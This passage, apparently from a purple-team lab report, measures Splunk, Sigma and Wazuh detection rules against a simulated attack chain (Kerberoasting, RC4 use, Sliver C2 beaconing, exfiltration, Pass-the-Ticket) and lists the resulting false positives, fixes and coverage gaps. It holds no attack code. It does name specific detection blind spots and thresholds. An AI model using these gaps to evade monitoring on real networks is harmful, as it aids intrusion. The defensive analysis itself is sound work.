enforcing it. One RC4 TGT was arguable as an artefact; two, to two different principals, from two
different tools, is the behaviour.

So the silence is not "nothing to anomaly on yet", which is what this cell said before. It is a
rule watching one Kerberos message type for a condition that arrives in another. A reader
checking RC4 coverage from this cell would conclude the estate has it instrumented.

**The owed work changes accordingly.** This is no longer a rule awaiting a positive test after
enforcement; it is a rule that needs `4768` as well as `4769` before that test means anything.

> **Applied, 9 Nov 2026 — and this is the one fix that does not wait for step 8.** The rule now
> reads `(EventCode=4768 OR EventCode=4769)` and splits the output by message type, because a
> `0x17` TGS is a downgraded Kerberoast while a `0x17` TGT is an account still holding and using
> an RC4 key — different findings from the same encryption type.
>
> It is exempt from the no-changes-between-columns discipline **because it is bundle 4's
> prerequisite**, and the exemption is narrow: without it, AES enforcement produces
> `✗ silent → ✗ silent`, and that silence would mean *"the rule is pointed at the wrong event"*
> rather than *"enforcement worked"*. Fixing it afterwards cannot recover the measurement.
>
> The before column is unaffected — `#13`'s cell was measured as silent against a control showing
> zero `0x17` in `4769`, which the fix does not change. What changes is that the after column can
> now say something. The post-enforcement test still has to use a **TGT**, since that is where
> this estate produces RC4; testing with a TGS would pass against a rule that still could not see
> the real case.
>
> `enableSched` stays `0`. Pre-enforcement the rule returns this estate's legitimate RC4, which
> is not an alertable condition; scheduling belongs with the bundle that makes `0x17` anomalous.

**Why the before column could not have caught this on its own.** Pre-hardening, the rule is
expected to be silent, so a silent result looks like confirmation. It took measuring a *different*
phase — Pass-the-Ticket, which has no rule and therefore no cell — to find out that RC4 was
present the whole time. A matrix built only from rules that exist cannot find the gaps between
them.

### #14 — Sliver C2 Beacon by JA4, phase 5a: ✓ fires on one of two hosts

Measured on 6 November, written up in the same section. The shipped fingerprint matches the one
the run produced exactly, with no drift from v3:

| Host | Handshakes | Window | Mean interval | Jitter | Rule |
| ---- | ---------- | ------ | ------------- | ------ | ---- |
| SPIDERMAN (`.138`) | 11 | 12:04:15–12:09:15 | 30.0 s | 23.9 s | fires |
| THEPUNISHER (`.137`) | 1 | — | n/a | n/a | silent |

The fingerprint is present on both endpoints and the alert covers one, because `where count > 5`
needs more than a single handshake to call something a beacon. The cell is recorded as `✓ fires`
with that asymmetry named, since reading the alert alone loses half the evidence.

---

### #15 — Large Outbound Transfer, phases 11 and 12: ✓ fires on both exfils, plus one false positive

`enableSched = 0`, so measured by running the search. Three rows:

| `_time` | orig_h | MB out | ports | verdict |
| ------- | ------ | ------ | ----- | ------- |
| 6 Nov 17:20 | `192.168.182.137` | 14.3 | 80, 138, 443, **8080** | IPv4 exfil |
| 6 Nov 17:30 | `fd15:…:336d:c973` | 66.8 | 136, 443, **8080**, 8081 | IPv6 exfil |
| 6 Nov 16:40 | `192.168.182.137` | 12.5 | 80, 137, 138, 443 | **false positive** |

Both exfiltration phases fire, including the IPv6 one — the rule's IPv6 branch works against a
real transfer, which is the first time it has been exercised.

**The third row, attributed.** The `values(resp_p)` list in the rule's output names which ports
appeared and says nothing about how the bytes divide, so the row had to be broken down before it
could be called anything:

```
… | where orig_h="192.168.182.137" AND _time>=…16:40 AND _time<…16:50
| stats sum(orig_bytes) as bytes by resp_h resp_p service | sort -bytes
```

| resp_h | port | service | bytes |
| ------ | ---- | ------- | ----- |
| `20.209.97.107` | 443 | ssl | **13,091,342** |
| `192.168.182.131` | 9997 | — | 2,573,830 |
| `4.208.165.242` | 443 | ssl | 24,278 |
| `192.168.182.255` | 137 | dns | 150 |

One destination accounts for all of it: 12.5 MB of ordinary Microsoft HTTPS. A hypothesis that
NetBIOS broadcast was inflating the total was wrong by four orders of magnitude — port 137
contributed 150 bytes. And the forwarder exclusion works: 2.57 MB to `.131:9997` is in the raw
data and absent from the rule's 12.48 MB sum.

So this is the placeholder threshold doing exactly what its own description predicts: 10 MB per
10 minutes was never calibrated and a single Windows service download clears it.

**This row is also where the verbatim-search rule earned itself.** An independent measurement of
the same window, taken from the same Splunk instance, read this traffic as *below* threshold and
recorded it as background. It used a per-flow filter — `orig_bytes > 1000000`, then a table of
individual connections — and by that reading it is correct: the two flows are 8,409,958 and
4,205,343 bytes, and neither reaches 10 MB on its own. But the shipped rule does
`bucket _time span=10m | stats sum(orig_bytes)` before it compares, and 8.4 + 4.2 = 12.6 MB in
one bucket. The rule fires. The difference between the two readings is not the data — both runs
saw the same bytes — it is that one applied the rule's aggregation and the other did not.

That is worth more than the cell. A per-flow view of a volume rule inverts its verdict whenever
an attacker, or Windows Update, splits a transfer; it is the same class of mistake as judging a
threshold rule by eye. The exfil rows survive either reading because each is a single large PUT,
which is precisely why the error would not have been caught on the true positives.

**Which makes it the third instance of one pattern, and that pattern is the finding.** This false
positive could not have appeared in the benign baseline, because the guests had no working egress
during that window (the dated 6 November note in [the v4 README](README.md) has the measurements)
— so the baseline measured `Large Outbound` against telemetry traffic only and found four rows,
all of them monitoring. Alongside `#10` (a benign LSASS reader that needs a Sysmon restart the
window contained none of) and `#2` (a fourth OneDrive binary that did not run in the window), that
is three rules whose false-positive profile the benign window was structurally unable to measure.
Three independent cases, one cause: **a false positive the baseline cannot see is a false positive
whose trigger the baseline's conditions excluded.** For `#15` the excluded condition is the thing
step 8 exists to fix, which means its threshold cannot be calibrated until that is done — the
rule and the fix are waiting on the same event.

---

## Still owed to this matrix

Two things this column does not yet have, recorded so they are not discovered later as gaps.

**The remaining layer coverage.** The Splunk table is one of four layers, and
[the other three are now measured](#the-other-three-layers-measured-6-nov-2026) for phases 1, 2,
4, 11 and 12. What is still missing is the same three layers for the phases the second pass did
not run — 5, 6, 7, 8, 9, 10 — and that is owed by the session that measured those.

**Shipped detection content still without a cell:**

| Layer | Shipped | Cells here |
| ----- | ------- | ---------- |
| Splunk saved searches | 15 attack-facing | 12 measured, 3 N/E |
| [Sigma, host](../detections/sigma/sigma_rules.yml) | 10 | none |
| [Sigma, network / Zeek](../detections/sigma/v3_ndr.yml) | 3 | 1 observed firing (Kerberoast, phase 4) |
| [Wazuh](../detections/wazuh/local_rules.xml) | 7 custom | 4 observed firing (`100200`, `100210`, `92203`, `92213`) |

**Two phases have shipped detection and no row in this matrix at all.** `v3_ndr.yml` carries
*WinRM Lateral Movement — East-West 5985*, which is phase 7; and the implant drop into `C:\Temp`
is caught by Wazuh `92203` and `92213`, the latter at level 15 — the loudest single event the
chain produced. Neither has a row, because the table was built from the Splunk app's rule list
and no Splunk search covers either. A reader checking coverage by this table would conclude the
lab has nothing for lateral movement or for implant drop, and it has both.

That is the structural lesson of this column, arrived at twice from opposite directions: **build
the next one from the shipped detection content, not from one tool's view of it.**

**The fixes this column has earned, all held until step 8.** Five rules want changes that are
deliberately not being made, because changing a rule between the before and after columns
destroys the comparison those columns exist to make:

| Rule | Change owed | Why it waits |
| ---- | ----------- | ------------ |
| `#10` LSASS Access | exclude `C:\Windows\Sysmon64.exe` | fires benignly after a DC Sysmon restart, which the bundles will cause |
| `#12` Verify Account Lockout | `Account_Locked_Out_Name`; drop `Caller_Computer_Name` | fires correctly, reports nothing usable |
| `#6` Spray Success | **reconsidered — see below** | the clock skew is produced by this lab's own revert procedure, not by the estate |
| `#2` C2 Beacon | extend the OneDrive allowlist to `OneDrive\Update\OneDriveSetup.exe` | a fourth OneDrive binary in a fourth directory shape |
| `#15` Large Outbound Transfer | calibrate the placeholder threshold | needs the second benign window's real egress, which does not exist yet |
| ~~`#13` RC4 Anomaly~~ | ~~add `4768`~~ — **done 9 Nov 2026**, ahead of the others and deliberately | it is bundle 4's prerequisite: unfixed, AES enforcement would read silent-to-silent and the silence would mean "pointed at the wrong event" rather than "enforcement worked" |

`#13` is owed a positive test rather than a fix: after AES enforcement, a deliberate RC4 request
should produce a row, and without that test its two silences prove nothing.

**One measurement, not a fix: `60205`'s false-positive rate over a clean full day.** It is the
only thing detecting phase 2a, it is a generic built-in, and the number behind it is currently
7.5 hours of an idle lab because Wazuh was dead for the rest of the benign window. The window
cannot be re-run; a fresh day after 3 November 11:12 can. Until then the `#5` coverage claim
stands on the thinnest evidence in this document.

**Two rules are owed that do not exist, both for phases that ran.** Pass-the-Ticket has no
coverage in any layer — a `4768` for an SPN-holding account sourced from a workstation would state
it, and the ATT&CK layer already scores the technique 75 rather than claim otherwise. And the
collection step at 16:24, 6.59 MB pulled back over WinRM, is caught by nothing: `#15` measures
bytes leaving an internal host, and this was internal-to-internal.

One rule is owed that does not exist yet: **a Zeek rule on `KDC_ERR_C_PRINCIPAL_UNKNOWN`.** The
`#11` cell establishes that Windows structurally cannot see Kerberos enumeration on this estate
and Zeek sees all of it, and no shipped rule closes that. Writing it is the single cheapest
coverage gain available here, and it is held for the same reason as the five fixes: new detection
content between the columns changes what the after column measures.

**`#6`'s owed fix was withdrawn on 9 November.** The plan was to exclude `0x25`
(`KRB_AP_ERR_SKEW`) from its failure side, on the reading that benign clock skew satisfies the
rule's shape. Measuring the estate after a snapshot revert showed where the skew comes from: a
guest booting on the snapshot's clock emits `0x25` until `w32time` converges, and THEPUNISHER was
**5.76 days** behind the DC for about an hour after today's revert. The four `0x25` errors behind
`#6`'s false positive, and the alert it
[actually delivered](#the-alert-history-which-this-column-should-have-read-first) at 09:40 on
6 November, are that mechanism — [the full measurement is in the v4 plan](README.md).

So the rule is reporting a real anomaly. **Excluding `0x25` would suppress a signal this lab
generates every time it rolls a VM back**, which is worse than the false positive: the next
genuine skew — a failing NTP hierarchy, a VM paused and resumed, a host with a drifting RTC —
would also go unreported. The fix is to the revert procedure, not to the rule, and it is in the
plan's step 4. `#6` stays as shipped.

`#2` and `#15` are owed something beyond their own fix, and it is the same thing. Both have a
`dest`-shaped hole — `#2` because the CIM model returns `-` where the destination belongs, `#15`
because its output names ports and not the bytes behind them. In both cases the rule fires and
the analyst's first question is the one the output cannot answer. Neither is a tuning problem.
